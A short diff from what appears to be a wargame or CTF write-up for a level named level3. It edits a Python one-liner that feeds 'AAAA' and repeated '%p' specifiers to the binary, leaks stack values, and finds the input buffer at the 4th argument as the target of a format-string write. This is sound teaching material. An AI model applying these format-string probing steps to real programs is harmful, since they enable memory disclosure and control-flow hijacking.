@@ -58,7 +58,7 @@ We can see the stack just by printing it:
     "%08x %08x %08x %08x %08x"
     "00000200 b7fd1ac0 b7ff37d0 38302522 30252078"
 
-python -c  ' print "AAAA" + "%p "*10 ' | ./level3
+python -c  'print "AAAA" + "%p "*10 ' | ./level3
 $    AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
                                         This
                                         the 4th argument shows 'A' (0x414141) so we should write to this address, $4.
